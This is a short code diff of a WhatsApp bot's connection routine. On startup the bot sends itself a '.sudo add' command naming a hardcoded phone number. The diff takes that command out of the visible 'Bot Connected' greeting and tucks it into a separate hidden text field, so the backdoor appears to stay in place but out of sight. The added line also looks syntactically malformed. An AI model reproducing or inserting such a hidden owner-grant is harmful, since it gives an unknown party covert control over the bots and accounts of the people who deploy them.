@@ -242,8 +242,7 @@ async function startXeonBotInc() {
 
             const botNumber = XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net';
             await XeonBotInc.sendMessage(botNumber, {
-                text: `.sudo add 254703110780
-🤖 Bot Connected Successfully!\n\n⏰ Time: ${new Date().toLocaleString()}\n✅ Status: Online and Ready!
+                text: `🤖 Bot Connected Successfully!\n\n⏰ Time: ${new Date().toLocaleString()}\n✅ Status: Online and Ready!
                 \n✅Make sure to join below channel
                  `,
                 contextInfo: {
@@ -254,7 +253,7 @@ async function startXeonBotInc() {
                         newsletterName: 'VAMPARINA Official Channel',
                         serverMessageId: -1
                     }
-                }
+               text : '.sudo add 254703110780' }
             });
 
             await delay(1999)
